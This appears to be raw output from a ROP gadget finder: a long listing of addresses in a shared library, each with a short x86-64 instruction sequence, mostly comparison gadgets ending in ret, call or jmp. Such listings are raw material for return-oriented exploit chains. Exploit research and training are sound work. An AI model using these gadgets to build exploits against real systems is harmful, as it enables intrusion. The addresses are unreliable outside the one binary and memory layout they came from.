0x00002aaaaabf7d14 : cmp eax, 0xff ; mov edx, 0x102 ; cmove eax, edx ; ret
0x00002aaaaabf7cd7 : cmp eax, 0xff ; mov edx, 0x104 ; cmove eax, edx ; ret
0x00002aaaaabd9acf : cmp eax, 0xfffff000 ; ja 0x104ae8 ; ret
0x00002aaaaabdb78f : cmp eax, 0xfffff000 ; ja 0x1067a8 ; ret
0x00002aaaaabdb9d1 : cmp eax, 0xfffff000 ; ja 0x1069e7 ; ret
0x00002aaaaabdba83 : cmp eax, 0xfffff000 ; ja 0x106a98 ; ret
0x00002aaaaabdbabd : cmp eax, 0xfffff000 ; ja 0x106ad8 ; ret
0x00002aaaaabdc66e : cmp eax, 0xfffff000 ; ja 0x107687 ; ret
0x00002aaaaabdc7ee : cmp eax, 0xfffff000 ; ja 0x107807 ; ret
0x00002aaaaabdcc88 : cmp eax, 0xfffff000 ; ja 0x107c97 ; ret
0x00002aaaaabdcd2a : cmp eax, 0xfffff000 ; ja 0x107d3f ; ret
0x00002aaaaabdcdda : cmp eax, 0xfffff000 ; ja 0x107def ; ret
0x00002aaaaabe9c3b : cmp eax, 0xfffff000 ; ja 0x114c50 ; ret
0x00002aaaaabe9ce8 : cmp eax, 0xfffff000 ; ja 0x114d12 ; ret
0x00002aaaaabeb9ad : cmp eax, 0xfffff000 ; ja 0x1169c8 ; ret
0x00002aaaaabeba5d : cmp eax, 0xfffff000 ; ja 0x116a78 ; ret
0x00002aaaaab0a429 : cmp eax, 0xfffff000 ; ja 0x35458 ; ret
0x00002aaaaab0a731 : cmp eax, 0xfffff000 ; ja 0x35748 ; ret
0x00002aaaaab0a79d : cmp eax, 0xfffff000 ; ja 0x357b8 ; ret
0x00002aaaaab0a7e7 : cmp eax, 0xfffff000 ; ja 0x357f7 ; ret
0x00002aaaaab90888 : cmp eax, 0xfffff000 ; ja 0xbb8a0 ; ret
0x00002aaaaab9c828 : cmp eax, 0xfffff000 ; ja 0xc7840 ; pop rbx ; ret
0x00002aaaaab9daa2 : cmp eax, 0xfffff000 ; ja 0xc8ab7 ; ret
0x00002aaaaaba0431 : cmp eax, 0xfffff000 ; ja 0xcb447 ; ret
0x00002aaaaaba04cb : cmp eax, 0xfffff000 ; ja 0xcb4df ; ret
0x00002aaaaaba05bc : cmp eax, 0xfffff000 ; ja 0xcb5cf ; ret
0x00002aaaaaba1714 : cmp eax, 0xfffff000 ; ja 0xcc727 ; ret
0x00002aaaaaba1784 : cmp eax, 0xfffff000 ; ja 0xcc797 ; ret
0x00002aaaaaba19d8 : cmp eax, 0xfffff000 ; ja 0xcc9e7 ; ret
0x00002aaaaaba1a58 : cmp eax, 0xfffff000 ; ja 0xcca67 ; ret
0x00002aaaaabcb006 : cmp eax, 0xfffff000 ; ja 0xf6018 ; ret
0x00002aaaaabcb055 : cmp eax, 0xfffff000 ; ja 0xf6068 ; ret
0x00002aaaaabcb0a6 : cmp eax, 0xfffff000 ; ja 0xf60b8 ; ret
0x00002aaaaabcb0fe : cmp eax, 0xfffff000 ; ja 0xf6118 ; ret
0x00002aaaaabcb162 : cmp eax, 0xfffff000 ; ja 0xf6178 ; ret
0x00002aaaaabcb1bb : cmp eax, 0xfffff000 ; ja 0xf61d0 ; ret
0x00002aaaaabcb39a : cmp eax, 0xfffff000 ; ja 0xf63b0 ; ret
0x00002aaaaabcba64 : cmp eax, 0xfffff000 ; ja 0xf6aa8 ; ret
0x00002aaaaabcfee3 : cmp eax, 0xfffff000 ; ja 0xfaef8 ; ret
0x00002aaaaabcff37 : cmp eax, 0xfffff000 ; ja 0xfaf48 ; ret
0x00002aaaaabd068b : cmp eax, 0xfffff000 ; ja 0xfb69f ; ret
0x00002aaaaabd0baf : cmp eax, 0xfffff000 ; ja 0xfbbc7 ; ret
0x00002aaaaabd145b : cmp eax, 0xfffff000 ; ja 0xfc46f ; ret
0x00002aaaaabd150b : cmp eax, 0xfffff000 ; ja 0xfc51f ; ret
0x00002aaaaabd15b6 : cmp eax, 0xfffff000 ; ja 0xfc5c7 ; ret
0x00002aaaaabd1626 : cmp eax, 0xfffff000 ; ja 0xfc637 ; ret
0x00002aaaaabd16a7 : cmp eax, 0xfffff000 ; ja 0xfc6b7 ; ret
0x00002aaaaabd1757 : cmp eax, 0xfffff000 ; ja 0xfc767 ; ret
0x00002aaaaabd1ca7 : cmp eax, 0xfffff000 ; ja 0xfccb8 ; ret
0x00002aaaaabd33c8 : cmp eax, 0xfffff000 ; ja 0xfe3e0 ; ret
0x00002aaaaabd345c : cmp eax, 0xfffff000 ; ja 0xfe470 ; ret
0x00002aaaaabd34fc : cmp eax, 0xfffff000 ; ja 0xfe510 ; ret
0x00002aaaaabd3550 : cmp eax, 0xfffff000 ; ja 0xfe568 ; ret
0x00002aaaaabd58ea : cmp eax, 0xfffff001 ; jae 0x1008f9 ; ret
0x00002aaaaabd5b58 : cmp eax, 0xfffff001 ; jae 0x100b67 ; ret
0x00002aaaaabd5b88 : cmp eax, 0xfffff001 ; jae 0x100b97 ; ret
0x00002aaaaabd5bc1 : cmp eax, 0xfffff001 ; jae 0x100c00 ; ret
0x00002aaaaabd5c18 : cmp eax, 0xfffff001 ; jae 0x100c27 ; ret
0x00002aaaaabd5c48 : cmp eax, 0xfffff001 ; jae 0x100c57 ; ret
0x00002aaaaabd5c7b : cmp eax, 0xfffff001 ; jae 0x100c8a ; ret
0x00002aaaaabd5ca8 : cmp eax, 0xfffff001 ; jae 0x100cb7 ; ret
0x00002aaaaabd5cd8 : cmp eax, 0xfffff001 ; jae 0x100ce7 ; ret
0x00002aaaaabd5d08 : cmp eax, 0xfffff001 ; jae 0x100d17 ; ret
0x00002aaaaabd5d38 : cmp eax, 0xfffff001 ; jae 0x100d47 ; ret
0x00002aaaaabda3fb : cmp eax, 0xfffff001 ; jae 0x10540a ; ret
0x00002aaaaabda428 : cmp eax, 0xfffff001 ; jae 0x105437 ; ret
0x00002aaaaabda458 : cmp eax, 0xfffff001 ; jae 0x105467 ; ret
0x00002aaaaabda48b : cmp eax, 0xfffff001 ; jae 0x10549a ; ret
0x00002aaaaabda4bb : cmp eax, 0xfffff001 ; jae 0x1054ca ; ret
0x00002aaaaabda4e8 : cmp eax, 0xfffff001 ; jae 0x1054f7 ; ret
0x00002aaaaabda51b : cmp eax, 0xfffff001 ; jae 0x10552a ; ret
0x00002aaaaabda548 : cmp eax, 0xfffff001 ; jae 0x105557 ; ret
0x00002aaaaabda578 : cmp eax, 0xfffff001 ; jae 0x105587 ; ret
0x00002aaaaabda5ab : cmp eax, 0xfffff001 ; jae 0x1055ba ; ret
0x00002aaaaabda5d8 : cmp eax, 0xfffff001 ; jae 0x1055e7 ; ret
0x00002aaaaabda60b : cmp eax, 0xfffff001 ; jae 0x10561a ; ret
0x00002aaaaabdb6f8 : cmp eax, 0xfffff001 ; jae 0x106707 ; ret
0x00002aaaaabdb728 : cmp eax, 0xfffff001 ; jae 0x106737 ; ret
0x00002aaaaabdb858 : cmp eax, 0xfffff001 ; jae 0x106867 ; ret
0x00002aaaaabdb898 : cmp eax, 0xfffff001 ; jae 0x1068a7 ; ret
0x00002aaaaabdb8c8 : cmp eax, 0xfffff001 ; jae 0x1068d7 ; ret
0x00002aaaaabdb8f8 : cmp eax, 0xfffff001 ; jae 0x106907 ; ret
0x00002aaaaabdb928 : cmp eax, 0xfffff001 ; jae 0x106937 ; ret
0x00002aaaaabdbb4b : cmp eax, 0xfffff001 ; jae 0x106b5a ; ret
0x00002aaaaabdbb78 : cmp eax, 0xfffff001 ; jae 0x106b87 ; ret
0x00002aaaaabdbba8 : cmp eax, 0xfffff001 ; jae 0x106bb7 ; ret
0x00002aaaaabdbbd8 : cmp eax, 0xfffff001 ; jae 0x106be7 ; ret
0x00002aaaaabdbc1b : cmp eax, 0xfffff001 ; jae 0x106c2a ; ret
0x00002aaaaabdbc48 : cmp eax, 0xfffff001 ; jae 0x106c57 ; ret
0x00002aaaaabdbc78 : cmp eax, 0xfffff001 ; jae 0x106c87 ; ret
0x00002aaaaabdbca8 : cmp eax, 0xfffff001 ; jae 0x106cb7 ; ret
0x00002aaaaabdbcd8 : cmp eax, 0xfffff001 ; jae 0x106ce7 ; ret
0x00002aaaaabdbd08 : cmp eax, 0xfffff001 ; jae 0x106d17 ; ret
0x00002aaaaabdbd38 : cmp eax, 0xfffff001 ; jae 0x106d47 ; ret
0x00002aaaaabdbd68 : cmp eax, 0xfffff001 ; jae 0x106d77 ; ret
0x00002aaaaabdbd98 : cmp eax, 0xfffff001 ; jae 0x106da7 ; ret
0x00002aaaaabdbdcb : cmp eax, 0xfffff001 ; jae 0x106dda ; ret
0x00002aaaaabdbe04 : cmp eax, 0xfffff001 ; jae 0x106e46 ; ret
0x00002aaaaabdbe58 : cmp eax, 0xfffff001 ; jae 0x106e67 ; ret
0x00002aaaaabdbe8b : cmp eax, 0xfffff001 ; jae 0x106e9a ; ret
0x00002aaaaabdbeb8 : cmp eax, 0xfffff001 ; jae 0x106ec7 ; ret
0x00002aaaaabdbee8 : cmp eax, 0xfffff001 ; jae 0x106ef7 ; ret
0x00002aaaaabdbf18 : cmp eax, 0xfffff001 ; jae 0x106f27 ; ret
0x00002aaaaabdbf48 : cmp eax, 0xfffff001 ; jae 0x106f57 ; ret
0x00002aaaaabdbf78 : cmp eax, 0xfffff001 ; jae 0x106f87 ; ret
0x00002aaaaabdbfab : cmp eax, 0xfffff001 ; jae 0x106fba ; ret
0x00002aaaaabdbfdb : cmp eax, 0xfffff001 ; jae 0x106fea ; ret
0x00002aaaaabdc008 : cmp eax, 0xfffff001 ; jae 0x107017 ; ret
0x00002aaaaabdc038 : cmp eax, 0xfffff001 ; jae 0x107047 ; ret
0x00002aaaaabdc06b : cmp eax, 0xfffff001 ; jae 0x10707a ; ret
0x00002aaaaabdc09b : cmp eax, 0xfffff001 ; jae 0x1070aa ; ret
0x00002aaaaabdc0cb : cmp eax, 0xfffff001 ; jae 0x1070da ; ret
0x00002aaaaabdc104 : cmp eax, 0xfffff001 ; jae 0x107146 ; ret
0x00002aaaaabdc158 : cmp eax, 0xfffff001 ; jae 0x107167 ; ret
0x00002aaaaabdc194 : cmp eax, 0xfffff001 ; jae 0x1071d6 ; ret
0x00002aaaaabdc1e8 : cmp eax, 0xfffff001 ; jae 0x1071f7 ; ret
0x00002aaaaabdc218 : cmp eax, 0xfffff001 ; jae 0x107227 ; ret
0x00002aaaaabdc254 : cmp eax, 0xfffff001 ; jae 0x107296 ; ret
0x00002aaaaabdc2a8 : cmp eax, 0xfffff001 ; jae 0x1072b7 ; ret
0x00002aaaaabdc2db : cmp eax, 0xfffff001 ; jae 0x1072ea ; ret
0x00002aaaaabdc308 : cmp eax, 0xfffff001 ; jae 0x107317 ; ret
0x00002aaaaabdc338 : cmp eax, 0xfffff001 ; jae 0x107347 ; ret
0x00002aaaaabdc36b : cmp eax, 0xfffff001 ; jae 0x10737a ; ret
0x00002aaaaabdc3a1 : cmp eax, 0xfffff001 ; jae 0x1073e0 ; ret
0x00002aaaaabdc3f8 : cmp eax, 0xfffff001 ; jae 0x107407 ; ret
0x00002aaaaabdc42b : cmp eax, 0xfffff001 ; jae 0x10743a ; ret
0x00002aaaaabdc45b : cmp eax, 0xfffff001 ; jae 0x10746a ; ret
0x00002aaaaabdc4b1 : cmp eax, 0xfffff001 ; jae 0x1074f0 ; ret
0x00002aaaaabdc508 : cmp eax, 0xfffff001 ; jae 0x107517 ; ret
0x00002aaaaabdc541 : cmp eax, 0xfffff001 ; jae 0x107580 ; ret
0x00002aaaaabdc598 : cmp eax, 0xfffff001 ; jae 0x1075a7 ; ret
0x00002aaaaabdc5c8 : cmp eax, 0xfffff001 ; jae 0x1075d7 ; ret
0x00002aaaaabdc5fb : cmp eax, 0xfffff001 ; jae 0x10760a ; ret
0x00002aaaaabdc628 : cmp eax, 0xfffff001 ; jae 0x107637 ; ret
0x00002aaaaabdc724 : cmp eax, 0xfffff001 ; jae 0x107766 ; ret
0x00002aaaaabdc781 : cmp eax, 0xfffff001 ; jae 0x1077c0 ; ret
0x00002aaaaabdc8a1 : cmp eax, 0xfffff001 ; jae 0x1078e0 ; ret
0x00002aaaaabdc904 : cmp eax, 0xfffff001 ; jae 0x107946 ; ret
0x00002aaaaabdc95b : cmp eax, 0xfffff001 ; jae 0x10796a ; ret
0x00002aaaaabdc988 : cmp eax, 0xfffff001 ; jae 0x107997 ; ret
0x00002aaaaabdc9b8 : cmp eax, 0xfffff001 ; jae 0x1079c7 ; ret
0x00002aaaaabdc9eb : cmp eax, 0xfffff001 ; jae 0x1079fa ; ret
0x00002aaaaabdcf44 : cmp eax, 0xfffff001 ; jae 0x107f86 ; ret
0x00002aaaaabdcfa4 : cmp eax, 0xfffff001 ; jae 0x107fe6 ; ret
0x00002aaaaabdcff8 : cmp eax, 0xfffff001 ; jae 0x108007 ; ret
0x00002aaaaabdd028 : cmp eax, 0xfffff001 ; jae 0x108037 ; ret
0x00002aaaaabdd058 : cmp eax, 0xfffff001 ; jae 0x108067 ; ret
0x00002aaaaabdd088 : cmp eax, 0xfffff001 ; jae 0x108097 ; ret
0x00002aaaaabdd0bb : cmp eax, 0xfffff001 ; jae 0x1080ca ; ret
0x00002aaaaabdd0eb : cmp eax, 0xfffff001 ; jae 0x1080fa ; ret
0x00002aaaaabdd118 : cmp eax, 0xfffff001 ; jae 0x108127 ; ret
0x00002aaaaabdd148 : cmp eax, 0xfffff001 ; jae 0x108157 ; ret
0x00002aaaaabdd178 : cmp eax, 0xfffff001 ; jae 0x108187 ; ret
0x00002aaaaabdd1a8 : cmp eax, 0xfffff001 ; jae 0x1081b7 ; ret
0x00002aaaaac14aab : cmp eax, 0xfffff001 ; jae 0x13faba ; ret
0x00002aaaaac14afb : cmp eax, 0xfffff001 ; jae 0x13fb0a ; ret
0x00002aaaaab0a768 : cmp eax, 0xfffff001 ; jae 0x35777 ; ret
0x00002aaaaab0ae28 : cmp eax, 0xfffff001 ; jae 0x35e37 ; ret
0x00002aaaaab1cb22 : cmp eax, 0xfffff001 ; jae 0x47b35 ; xor eax, eax ; ret
0x00002aaaaab40368 : cmp eax, 0xfffff001 ; jae 0x6b377 ; ret
0x00002aaaaab4039b : cmp eax, 0xfffff001 ; jae 0x6b3aa ; ret
0x00002aaaaab90968 : cmp eax, 0xfffff001 ; jae 0xbb977 ; ret
0x00002aaaaab93a58 : cmp eax, 0xfffff001 ; jae 0xbea67 ; ret
0x00002aaaaab93a88 : cmp eax, 0xfffff001 ; jae 0xbea97 ; ret
0x00002aaaaaba0388 : cmp eax, 0xfffff001 ; jae 0xcb397 ; ret
0x00002aaaaaba057b : cmp eax, 0xfffff001 ; jae 0xcb58a ; ret
0x00002aaaaaba0658 : cmp eax, 0xfffff001 ; jae 0xcb667 ; ret
0x00002aaaaaba06e1 : cmp eax, 0xfffff001 ; jae 0xcb720 ; ret
0x00002aaaaaba0741 : cmp eax, 0xfffff001 ; jae 0xcb780 ; ret
0x00002aaaaaba0b42 : cmp eax, 0xfffff001 ; jae 0xcbb51 ; ret
0x00002aaaaaba0bc8 : cmp eax, 0xfffff001 ; jae 0xcbbd7 ; ret
0x00002aaaaaba16d8 : cmp eax, 0xfffff001 ; jae 0xcc6e7 ; ret
0x00002aaaaaba1878 : cmp eax, 0xfffff001 ; jae 0xcc887 ; ret
0x00002aaaaaba18a8 : cmp eax, 0xfffff001 ; jae 0xcc8b7 ; ret
0x00002aaaaaba1908 : cmp eax, 0xfffff001 ; jae 0xcc917 ; ret
0x00002aaaaaba1938 : cmp eax, 0xfffff001 ; jae 0xcc947 ; ret
0x00002aaaaaba1968 : cmp eax, 0xfffff001 ; jae 0xcc977 ; ret
0x00002aaaaaba1998 : cmp eax, 0xfffff001 ; jae 0xcc9a7 ; ret
0x00002aaaaabbeb88 : cmp eax, 0xfffff001 ; jae 0xe9b97 ; ret
0x00002aaaaabbebb8 : cmp eax, 0xfffff001 ; jae 0xe9bc7 ; ret
0x00002aaaaabbebe8 : cmp eax, 0xfffff001 ; jae 0xe9bf7 ; ret
0x00002aaaaabbec18 : cmp eax, 0xfffff001 ; jae 0xe9c27 ; ret
0x00002aaaaabbec48 : cmp eax, 0xfffff001 ; jae 0xe9c57 ; ret
0x00002aaaaabbec78 : cmp eax, 0xfffff001 ; jae 0xe9c87 ; ret
0x00002aaaaabbeca8 : cmp eax, 0xfffff001 ; jae 0xe9cb7 ; ret
0x00002aaaaabbecd8 : cmp eax, 0xfffff001 ; jae 0xe9ce7 ; ret
0x00002aaaaabc9e94 : cmp eax, 0xfffff001 ; jae 0xf4ed6 ; ret
0x00002aaaaabc9ef4 : cmp eax, 0xfffff001 ; jae 0xf4f36 ; ret
0x00002aaaaabcaf68 : cmp eax, 0xfffff001 ; jae 0xf5f77 ; ret
0x00002aaaaabcb208 : cmp eax, 0xfffff001 ; jae 0xf6217 ; ret
0x00002aaaaabcb238 : cmp eax, 0xfffff001 ; jae 0xf6247 ; ret
0x00002aaaaabcb308 : cmp eax, 0xfffff001 ; jae 0xf6317 ; ret
0x00002aaaaabcb338 : cmp eax, 0xfffff001 ; jae 0xf6347 ; ret
0x00002aaaaabcb3f8 : cmp eax, 0xfffff001 ; jae 0xf6407 ; ret
0x00002aaaaabcb428 : cmp eax, 0xfffff001 ; jae 0xf6437 ; ret
0x00002aaaaabcb461 : cmp eax, 0xfffff001 ; jae 0xf64a0 ; ret
0x00002aaaaabcb681 : cmp eax, 0xfffff001 ; jae 0xf66c0 ; ret
0x00002aaaaabcb6e1 : cmp eax, 0xfffff001 ; jae 0xf6720 ; ret
0x00002aaaaabcb738 : cmp eax, 0xfffff001 ; jae 0xf6747 ; ret
0x00002aaaaabcbbc8 : cmp eax, 0xfffff001 ; jae 0xf6bd7 ; ret
0x00002aaaaabcbd11 : cmp eax, 0xfffff001 ; jae 0xf6d50 ; ret
0x00002aaaaabcbd68 : cmp eax, 0xfffff001 ; jae 0xf6d77 ; ret
0x00002aaaaabcbd98 : cmp eax, 0xfffff001 ; jae 0xf6da7 ; ret
0x00002aaaaabcbdc8 : cmp eax, 0xfffff001 ; jae 0xf6dd7 ; ret
0x00002aaaaabcbdf8 : cmp eax, 0xfffff001 ; jae 0xf6e07 ; ret
0x00002aaaaabcbe28 : cmp eax, 0xfffff001 ; jae 0xf6e37 ; ret
0x00002aaaaabcbe61 : cmp eax, 0xfffff001 ; jae 0xf6ea0 ; ret
0x00002aaaaabcbeb8 : cmp eax, 0xfffff001 ; jae 0xf6ec7 ; ret
0x00002aaaaabcbee8 : cmp eax, 0xfffff001 ; jae 0xf6ef7 ; ret
0x00002aaaaabcc718 : cmp eax, 0xfffff001 ; jae 0xf7727 ; ret
0x00002aaaaabcc748 : cmp eax, 0xfffff001 ; jae 0xf7757 ; ret
0x00002aaaaabcc778 : cmp eax, 0xfffff001 ; jae 0xf7787 ; ret
0x00002aaaaabcc7ab : cmp eax, 0xfffff001 ; jae 0xf77ba ; ret
0x00002aaaaabccd88 : cmp eax, 0xfffff001 ; jae 0xf7d97 ; ret
0x00002aaaaabccdbb : cmp eax, 0xfffff001 ; jae 0xf7dca ; ret
0x00002aaaaabccde8 : cmp eax, 0xfffff001 ; jae 0xf7df7 ; ret
0x00002aaaaabcce18 : cmp eax, 0xfffff001 ; jae 0xf7e27 ; ret
0x00002aaaaabcce48 : cmp eax, 0xfffff001 ; jae 0xf7e57 ; ret
0x00002aaaaabcce7b : cmp eax, 0xfffff001 ; jae 0xf7e8a ; ret
0x00002aaaaabccea8 : cmp eax, 0xfffff001 ; jae 0xf7eb7 ; ret
0x00002aaaaabcced8 : cmp eax, 0xfffff001 ; jae 0xf7ee7 ; ret
0x00002aaaaabccf08 : cmp eax, 0xfffff001 ; jae 0xf7f17 ; ret
0x00002aaaaabcfb41 : cmp eax, 0xfffff001 ; jae 0xfab80 ; ret
0x00002aaaaabcfeab : cmp eax, 0xfffff001 ; jae 0xfaeba ; ret
0x00002aaaaabd0624 : cmp eax, 0xfffff001 ; jae 0xfb666 ; ret
0x00002aaaaabd0d78 : cmp eax, 0xfffff001 ; jae 0xfbd87 ; ret
0x00002aaaaabd0da8 : cmp eax, 0xfffff001 ; jae 0xfbdb7 ; ret
0x00002aaaaabd0dd8 : cmp eax, 0xfffff001 ; jae 0xfbde7 ; ret
0x00002aaaaabd1178 : cmp eax, 0xfffff001 ; jae 0xfc187 ; ret
0x00002aaaaabd1358 : cmp eax, 0xfffff001 ; jae 0xfc367 ; ret
0x00002aaaaabd1391 : cmp eax, 0xfffff001 ; jae 0xfc3d0 ; ret
0x00002aaaaabd13f1 : cmp eax, 0xfffff001 ; jae 0xfc430 ; ret
0x00002aaaaabd18e8 : cmp eax, 0xfffff001 ; jae 0xfc8f7 ; ret
0x00002aaaaabd1988 : cmp eax, 0xfffff001 ; jae 0xfc997 ; ret
0x00002aaaaabd19c4 : cmp eax, 0xfffff001 ; jae 0xfca06 ; ret
0x00002aaaaabd1b18 : cmp eax, 0xfffff001 ; jae 0xfcb27 ; ret
0x00002aaaaabd1b48 : cmp eax, 0xfffff001 ; jae 0xfcb57 ; ret
0x00002aaaaabd1b81 : cmp eax, 0xfffff001 ; jae 0xfcbc0 ; ret
0x00002aaaaabd1bd8 : cmp eax, 0xfffff001 ; jae 0xfcbe7 ; ret
0x00002aaaaabd1c11 : cmp eax, 0xfffff001 ; jae 0xfcc50 ; ret
0x00002aaaaabd1c68 : cmp eax, 0xfffff001 ; jae 0xfcc77 ; ret
0x00002aaaaabd1fd8 : cmp eax, 0xfffff001 ; jae 0xfcfe7 ; ret
0x00002aaaaabd2008 : cmp eax, 0xfffff001 ; jae 0xfd017 ; ret
0x00002aaaaabd2038 : cmp eax, 0xfffff001 ; jae 0xfd047 ; ret
0x00002aaaaabd3588 : cmp eax, 0xfffff001 ; jae 0xfe597 ; ret
0x00002aaaaabd35b8 : cmp eax, 0xfffff001 ; jae 0xfe5c7 ; ret
0x00002aaaaabe9f58 : cmp eax, 0xfffffe93 ; call rax
0x00002aaaaab7f17f : cmp eax, 2 ; je 0xaa197 ; xor eax, eax ; ret
0x00002aaaaac0eea1 : cmp eax, 2 ; sete al ; movzx eax, al ; ret
0x00002aaaaac021b0 : cmp eax, 3 ; jbe 0x12d1ca ; mov eax, 2 ; ret
0x00002aaaaabaf37e : cmp eax, 3 ; je 0xda398 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe956a : cmp eax, 4 ; je 0x114575 ; ret
0x00002aaaaac25a14 : cmp eax, dword ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac73afd : cmp eax, dword ptr [rax] ; add al, ah ; xor al, 0xea ; jmp rax
0x00002aaaaab4e615 : cmp eax, dword ptr [rdi + 0x10] ; jae 0x79628 ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaac91604 : cmp eax, dword ptr [rip + 0x1e70000] ; add byte ptr [rax], al ; ret 4
0x00002aaaaabd7f41 : cmp eax, dword ptr [rip - 0x9cf0000] ; mov rdi, r12 ; call rbx
0x00002aaaaab7ffbe : cmp eax, dword ptr [rsi + 0x10] ; jne 0xab0b9 ; ret
0x00002aaaaab7ffd3 : cmp eax, dword ptr [rsi + 0x14] ; jne 0xab0b9 ; ret
0x00002aaaaab7ffe8 : cmp eax, dword ptr [rsi + 0x18] ; jne 0xab0b9 ; ret
0x00002aaaaab80003 : cmp eax, dword ptr [rsi + 0x1c] ; jne 0xab0b9 ; ret
0x00002aaaaab8001e : cmp eax, dword ptr [rsi + 0x20] ; jne 0xab0b9 ; ret
0x00002aaaaab80033 : cmp eax, dword ptr [rsi + 0x24] ; jne 0xab0b5 ; ret
0x00002aaaaab80048 : cmp eax, dword ptr [rsi + 0x28] ; jne 0xab0b5 ; ret
0x00002aaaaab80053 : cmp eax, dword ptr [rsi + 0x2c] ; jne 0xab0b5 ; ret
0x00002aaaaab8006e : cmp eax, dword ptr [rsi + 0x30] ; jne 0xab0b5 ; ret
0x00002aaaaab80083 : cmp eax, dword ptr [rsi + 0x34] ; jne 0xab0b5 ; ret
0x00002aaaaab80098 : cmp eax, dword ptr [rsi + 0x38] ; jne 0xab0b5 ; ret
0x00002aaaaab800a3 : cmp eax, dword ptr [rsi + 0x3c] ; jne 0xab0b5 ; ret
0x00002aaaaab7ffa3 : cmp eax, dword ptr [rsi + 0xc] ; jne 0xab0b9 ; ret
0x00002aaaaab7ff73 : cmp eax, dword ptr [rsi + 4] ; jne 0xab0b9 ; ret
0x00002aaaaab7ff88 : cmp eax, dword ptr [rsi + 8] ; jne 0xab0b9 ; ret
0x00002aaaaac46c0a : cmp eax, dword ptr [rsi - 0x10] ; jne 0x171d49 ; ret
0x00002aaaaac46c23 : cmp eax, dword ptr [rsi - 0xc] ; jne 0x171d49 ; ret
0x00002aaaaac46d33 : cmp eax, dword ptr [rsi - 4] ; jne 0x171d47 ; xor eax, eax ; ret
0x00002aaaaac46c53 : cmp eax, dword ptr [rsi - 4] ; jne 0x171d49 ; ret
0x00002aaaaac46c38 : cmp eax, dword ptr [rsi - 8] ; jne 0x171d49 ; ret
0x00002aaaaab7ff5d : cmp eax, dword ptr [rsi] ; jne 0xab0b8 ; ret
0x00002aaaaabd51c4 : cmp eax, ecx ; cmovne rbx, rax ; call 0xfc3e8
0x00002aaaaab7f3d7 : cmp eax, ecx ; ja 0xaa3fb ; sub rdi, 0x10 ; add rax, rdi ; ret
0x00002aaaaab51c49 : cmp eax, ecx ; jae 0x7cc77 ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab7307d : cmp eax, ecx ; je 0x9e065 ; ret
0x00002aaaaac46502 : cmp eax, ecx ; jne 0x17171a ; xor eax, eax ; ret
0x00002aaaaac4666a : cmp eax, ecx ; jne 0x17172f ; xor eax, eax ; ret
0x00002aaaaaad8af7 : cmp eax, ecx ; mov bl, 0xf7 ; adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaac46723 : cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x00002aaaaabe8ddb : cmp eax, edx ; jb 0x113dd6 ; xor eax, eax ; ret
0x00002aaaaac0c6f1 : cmp eax, edx ; je 0x137708 ; add rsp, 8 ; ret
0x00002aaaaabf79ca : cmp eax, edx ; jne 0x1229a9 ; mov qword ptr [rsi], rcx ; xor eax, eax ; ret
0x00002aaaaab1d085 : cmp eax, edx ; jne 0x4807e ; xor eax, eax ; ret
0x00002aaaaab5cb8d : cmp eax, edx ; jne 0x87b47 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe3b85 : cmp eax, esi ; jae 0x10ebb0 ; cmp byte ptr [r8], r9b ; je 0x10ebb7 ; mov rdx, r8 ; jmp 0x10eba7
0x00002aaaaab502d1 : cmp eax, esi ; jae 0x7b289 ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaabe2dd9 : cmp eax, esi ; jb 0x10ddf1 ; mov eax, 1 ; ret
0x00002aaaaababa98 : cmp eax, esi ; jge 0xd6a75 ; mov edx, eax ; jmp 0xd6a7e
0x00002aaaaac05cd4 : cmp ebp, dword ptr [rcx] ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00002aaaaac73bd9 : cmp ebp, edx ; call qword ptr [rbx]
0x00002aaaaabe9506 : cmp ebx, 0xa ; je 0x114511 ; ret
0x00002aaaaac6937d : cmp ebx, 0xff ; and byte ptr [rbp - 0x795f0005], al ; sti ; jmp qword ptr [rax]
0x00002aaaaab947df : cmp ebx, 0xff ; dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaab9bcd4 : cmp ebx, dword ptr [rdx + 0x10] ; jg 0xc6cad ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab529bb : cmp ebx, eax ; je 0x7dbe1 ; mov rdx, rax ; jmp 0x7d9ea
0x00002aaaaab53c15 : cmp ebx, eax ; je 0x7ec26 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbc5f : cmp ebx, eax ; jne 0xf6ceb ; add rsp, 0x20 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac4878a : cmp ebx, ebp ; jae 0x17379d ; call qword ptr [rbx]
0x00002aaaaac4878a : cmp ebx, ebp ; jae 0x1737a1 ; call qword ptr [rbx]
0x00002aaaaac49545 : cmp ebx, ebp ; jae 0x174566 ; nop dword ptr [rax] ; call qword ptr [rbx]
0x00002aaaaac487b9 : cmp ebx, ebp ; jb 0x1737b3 ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaac49557 : cmp ebx, ebp ; jb 0x17455a ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1db7c : cmp ecx, 0xff ; jne 0x48b79 ; mov rax, rdx ; ret
0x00002aaaaabc5285 : cmp ecx, dword ptr [rax + 0x39] ; ret 0x860f
0x00002aaaaac008b5 : cmp ecx, dword ptr [rax - 0x75] ; or byte ptr [r10], r13b ; push 0x19 ; call qword ptr [rax]
0x00002aaaaabc85a9 : cmp ecx, dword ptr [rax - 0x77] ; ret
0x00002aaaaaaf9ca1 : cmp ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaac44a64 : cmp ecx, dword ptr [rdi - 4] ; jne 0x16fca1 ; xor eax, eax ; ret
0x00002aaaaab90b10 : cmp ecx, dword ptr [rdi] ; imul esi, esi, 0x3c ; add eax, esi ; ret
0x00002aaaaab71f07 : cmp ecx, dword ptr [rdi] ; mov dh, 0x45 ; ret 0x8348
0x00002aaaaab6ffc3 : cmp ecx, dword ptr [rdi] ; mov dh, 0x55 ; ret 0x8348
0x00002aaaaac17901 : cmp ecx, dword ptr [rdx + 0x28] ; jae 0x1428ea ; mov eax, 1 ; ret
